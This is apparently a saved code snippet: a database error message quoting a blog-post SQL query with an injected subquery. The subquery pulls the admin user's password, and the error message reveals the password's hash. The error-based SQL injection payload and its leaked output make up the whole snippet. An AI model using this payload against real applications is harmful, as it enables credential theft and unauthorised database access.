---
id: 6aaaad99-5750-4a98-9703-94b662a49f8c
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:33.305104+00:00'
updated_at: '2023-04-10T20:22:26.250391+00:00'
---

# Code Snippet 6aaaad99

**Language**: SQL

```sql
Data conversion error converting "d41d8cd98f00b204e9800998ecf8427e"; SQL statement:
select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1
```
